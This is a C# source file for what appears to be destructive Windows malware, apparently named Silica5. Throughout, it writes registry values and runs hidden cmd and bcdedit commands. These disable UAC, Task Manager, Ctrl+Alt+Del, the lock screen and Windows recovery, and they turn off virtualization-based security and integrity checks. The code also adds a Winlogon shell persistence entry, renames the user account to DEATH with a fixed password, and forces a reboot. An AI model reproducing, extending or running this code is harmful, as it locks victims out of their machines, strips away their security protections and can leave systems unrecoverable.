using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Silic5
{
    public class Regs
    {
        public void Reg_func()
        {
            Random rand;
            rand = new Random();
            RegistryKey reg_disuac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_disuac.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
            reg_disuac.SetValue("LocalAccountTokenFilterPolicy", 1, RegistryValueKind.DWord);
            reg_disuac.SetValue("LegalNoticeCaption", "000", RegistryValueKind.String);
            reg_disuac.SetValue("LegalNoticeText", "NULL" + Environment.NewLine + "╤ £ ▄ œ Σ ╚ ¥ ε ▲", RegistryValueKind.String);
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            rk.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
            RegistryKey reg_logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_logon.SetValue("shutdownwithoutlogon", 0, RegistryValueKind.DWord);
            RegistryKey reg_dlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            reg_dlogon.SetValue("DisableLogonBackgroundImage", 1, RegistryValueKind.DWord);
            RegistryKey reg_winlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_winlogon.SetValue("AutoRestartShell", 0, RegistryValueKind.DWord);
            reg_winlogon.SetValue("DisableCAD", 1, RegistryValueKind.DWord);
            RegistryKey uac = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            uac.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
            uac.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            byte[] hax_values = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x4d,
                0xe0,0x1d,0xe0,0x4b,0xe0,0x1d,0x00,0x00,0x00,0x00,0x00 };
            RegistryKey reg_ctrlad = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout");
            reg_ctrlad.SetValue("Scancode Map", hax_values, RegistryValueKind.Binary);
            RegistryKey reg_explo = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_explo.SetValue("Shell", @"explorer.exe, C:\Windows\System32\Silica5.exe", RegistryValueKind.String);
            RegistryKey reg_arrow = Registry.CurrentUser.CreateSubKey("Control Panel\\Cursors");
            reg_arrow.SetValue("Arrow", @"C:\Program Files (x86)\Microsoft\Temp\ar_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("AppStarting", @"C:\Program Files (x86)\Microsoft\Temp\aw_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("Hand", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("Wait", @"C:\Program Files (x86)\Microsoft\Temp\ab_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("No", @"C:\Program Files (x86)\Microsoft\Temp\ar_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("Help", @"C:\Program Files (x86)\Microsoft\Temp\ar_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("NWPen", @"C:\Program Files (x86)\Microsoft\Temp\ar_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("SizeAll", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("SizeNESW", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("SizeNS", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("SizeNWSE", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("SizeWE", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            reg_arrow.SetValue("UpArrow", @"C:\Program Files (x86)\Microsoft\Temp\al_g.ani", RegistryValueKind.String);
            RegistryKey reg_ico = Registry.ClassesRoot.CreateSubKey("Unknown\\DefaultIcon");
            reg_ico.SetValue("", @"C:\Program Files (x86)\Microsoft\Temp\blank.ico", RegistryValueKind.String);
            RegistryKey reg_lock = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\Personalization");
            reg_lock.SetValue("LockScreenImage", "", RegistryValueKind.String);
            reg_lock.SetValue("NoLockScreen", 1, RegistryValueKind.DWord);
            reg_lock.SetValue("NoLockScreenCamera", 1, RegistryValueKind.DWord);
            RegistryKey reg_wp = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
            reg_wp.SetValue("Wallpaper", @"C:\Program Files (x86)\Microsoft\Temp\wallpaper.jpg", RegistryValueKind.String);
            var generator_h = new Generator();
            var cmd_h = new cmd_proc(); 
            char[] rnd_char = { '☼', '◙', '♂', '♀', '♪', '♫', '►', '◄', '↕', '¶', '▬', '☺', '☻', '♥', '♦', '♣', '♠',
            '•', '◘', '○', '▲', '▼', 'ž', 'ř', 'č', 'é', 'í', 'ÿ', 'ï', 'ä', 'ö', 'ó', 'š', 'ě', '╚', '╔',
            '╩', '╠', '╬', '╧', '╤', '╥', '↑', '■', '±', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'œ', 'Ÿ', '¼', '½',
            '¾', 'ń', '£', '¤', '¥', 'Â' , '¢', 'Æ', 'Ç', '«', '¬', '®' , 'å', 'ß', 'ø', 'õ', '×', 'ñ' , 'æ', '√', 'ε',
            '₧', 'Σ', 'σ' , 'µ', '█', '▄', '▌', '▐', '▀', '∞', 'π', '≈', 'φ', '²', '∩', '—' ,'™' };
            string rnd_name;
            string rnd_name2 = "";
            for(int num = 0; num < rand.Next(5, 15); num++){
                rnd_name = rnd_char[rand.Next(rnd_char.Length)].ToString();
                rnd_name2 = rnd_name2 + rnd_name;
            }
            try
            {
                cmd_h.cmd_process("cmd.exe", @"/k wmic useraccount where name=""%username%"" rename DEATH && net user DEATH kill && exit", ProcessWindowStyle.Hidden); //rename users and set kill as pw
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set hypervisorlaunchtype off", ProcessWindowStyle.Hidden); //disable hypervisor to prevent windows fighting back
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set vsmlaunchtype off", ProcessWindowStyle.Hidden); //disable VBS component
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set isolatedcontext No", ProcessWindowStyle.Hidden); //also VBS component
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set quietboot on", ProcessWindowStyle.Hidden);
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set bootux disabled", ProcessWindowStyle.Hidden);
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set bootuxdisabled on", ProcessWindowStyle.Hidden);
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set bootstatuspolicy ignoreshutdownfailures", ProcessWindowStyle.Hidden); //disables failures
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set nointegritychecks on", ProcessWindowStyle.Hidden); //disable systemfile corruption
                cmd_h.cmd_process("cmd.exe", "/c reagentc /disable", ProcessWindowStyle.Hidden); //disable WINREC
                cmd_h.cmd_process("cmd.exe", "/c bcdedit /set testsigning on", ProcessWindowStyle.Hidden); //idk man i think it's better to disable kernel mode protection lol
                Thread.Sleep(5000);
                RebootHelper.ForceRebootComputer();
            }
            catch
            {

            }
            rk.Close(); reg_disuac.Close(); reg_ctrlad.Close(); reg_explo.Close(); reg_arrow.Close(); uac.Close();
            reg_ico.Close(); reg_lock.Close(); reg_wp.Close(); reg_logon.Close(); reg_dlogon.Close(); reg_winlogon.Close();
        }
    }
}
